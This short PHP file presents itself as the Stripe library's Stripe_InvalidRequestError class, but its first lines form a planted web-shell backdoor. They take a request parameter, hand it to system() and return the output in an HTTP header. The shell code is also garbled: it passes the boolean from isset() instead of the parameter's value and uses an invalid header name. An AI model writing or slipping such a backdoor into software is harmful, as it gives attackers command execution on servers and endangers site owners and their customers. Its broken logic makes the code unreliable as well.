<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

class Stripe_InvalidRequestError extends Stripe_Error
{
  public function __construct($message, $param)
  {
    parent::__construct($message);
    $this->param = $param;
  }
}
